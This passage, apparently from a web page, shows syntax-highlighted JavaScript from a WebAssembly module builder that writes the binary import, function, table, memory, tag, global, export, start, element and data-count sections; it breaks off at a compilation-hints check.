                  <span class="token function">emit</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>initial<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> <span class="token function">emit</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>maximum<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalTable<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">var</span> has_max <span class="token operator">=</span> <span class="token keyword">typeof</span> imp<span class="token punctuation">.</span>maximum <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// flags</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>initial<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// initial</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>maximum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// maximum</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>imp<span class="token punctuation">.</span>kind <span class="token operator">==</span> kExternalTag<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>kExceptionAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>imp<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
                    <span class="token string">"unknown/unsupported import kind "</span> <span class="token operator">+</span> imp<span class="token punctuation">.</span>kind
                  <span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add functions declarations.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting function decls @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kFunctionSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add table section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting tables @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTableSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tables<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> table <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>tables<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_init<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "has initializer"</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Reserved byte.</span>
                <span class="token punctuation">&#125;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>initial_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_max<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>max_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>table<span class="token punctuation">.</span>has_init<span class="token punctuation">)</span> section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>init_expr<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add memory section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting memories @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kMemorySectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>memories<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> memory <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>memories<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">const</span> has_max <span class="token operator">=</span> memory<span class="token punctuation">.</span>max <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
                <span class="token keyword">const</span> is_shared <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>memory<span class="token punctuation">.</span>shared<span class="token punctuation">;</span>
                <span class="token keyword">const</span> is_memory64 <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span>memory<span class="token punctuation">.</span>is_memory64<span class="token punctuation">;</span>
                <span class="token keyword">let</span> limits_byte <span class="token operator">=</span>
                  <span class="token punctuation">(</span>is_memory64 <span class="token operator">?</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>
                  <span class="token punctuation">(</span>is_shared <span class="token operator">?</span> <span class="token number">2</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span>
                  <span class="token punctuation">(</span>has_max <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>limits_byte<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> <span class="token function-variable function">emit</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token operator">=></span>
                  is_memory64 <span class="token operator">?</span> section<span class="token punctuation">.</span><span class="token function">emit_u64v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">:</span> section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">emit</span><span class="token punctuation">(</span>memory<span class="token punctuation">.</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>has_max<span class="token punctuation">)</span> <span class="token function">emit</span><span class="token punctuation">(</span>memory<span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add tag section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting tags @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kTagSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>tags<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> type_index <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>tags<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>kExceptionAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>type_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add stringref section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting stringrefs @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kStringRefSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>stringrefs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add global section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting globals @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kGlobalSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>globals<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> global <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>globals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>mutable<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>global<span class="token punctuation">.</span>init<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add export table.</span>
          <span class="token keyword">var</span> exports_count <span class="token operator">=</span> wasm<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>exports_count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting exports @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kExportSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>exports_count<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> exp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>exports<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>kind<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>exp<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add start function section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>start_index <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting start function @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kStartSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>start_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add element segments.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>element_segments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting element segments @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kElementSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">var</span> segments <span class="token operator">=</span> wasm<span class="token punctuation">.</span>element_segments<span class="token punctuation">;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> segment <span class="token keyword">of</span> segments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// Emit flag and header.</span>
                <span class="token comment">// Each case below corresponds to a flag from</span>
                <span class="token comment">// https://webassembly.github.io/spec/core/binary/modules.html#element-section</span>
                <span class="token comment">// (not in increasing order).</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_active</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> segment<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x04</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x06</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x02</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>table<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExternalFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x05</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">is_passive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x01</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                      section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0x03</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExternalFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token comment">// Emit elements.</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>segment<span class="token punctuation">.</span>elements<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> element <span class="token keyword">of</span> segment<span class="token punctuation">.</span>elements<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>segment<span class="token punctuation">.</span><span class="token function">expressions_as_elements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_init_expr</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// If there are any passive data segments, add the DataCount section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span> <span class="token comment">/*wasm.data_segments.some(seg => !seg.is_active)*/</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kDataCountSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// If there are compilation hints add a custom section 'compilationHints'</span>
          <span class="token comment">// after the function section and before the code section.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
